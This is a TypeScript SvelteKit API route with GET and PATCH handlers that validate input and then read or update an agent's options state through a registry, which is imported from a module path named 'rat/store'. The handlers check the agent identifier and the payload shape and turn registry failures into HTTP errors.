import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import type {
	AgentOptionsResponse,
	AgentOptionsUpdateRequest,
	AgentOptionsUpdateResponse
} from '../../../../../../../shared/types/options';

export const GET: RequestHandler = async ({ params }) => {
        const id = params.id;
        if (!id) {
                throw error(400, 'Missing agent identifier');
        }

        try {
                const state = registry.getAgentOptionsState(id);
                const response: AgentOptionsResponse = { state };
                return json(response);
        } catch (err) {
                if (err instanceof RegistryError) {
                        throw error(err.status, err.message);
                }
                throw error(500, 'Failed to read agent options state');
	}
};

export const PATCH: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

        let payload: AgentOptionsUpdateRequest;
        try {
                payload = (await request.json()) as AgentOptionsUpdateRequest;
        } catch {
                throw error(400, 'Invalid options state payload');
        }

        if (!payload || typeof payload !== 'object' || Array.isArray(payload)) {
                throw error(400, 'Invalid options state payload');
        }

        if (
                'state' in payload &&
                payload.state !== null &&
                typeof payload.state !== 'object'
        ) {
                throw error(400, 'Invalid options state payload');
        }

        try {
                const state = registry.updateAgentOptionsState(id, payload?.state ?? null);
                const response: AgentOptionsUpdateResponse = { state };
                return json(response);
        } catch (err) {
                if (err instanceof RegistryError) {
                        throw error(err.status, err.message);
                }
                throw error(500, 'Failed to update agent options state');
	}
};
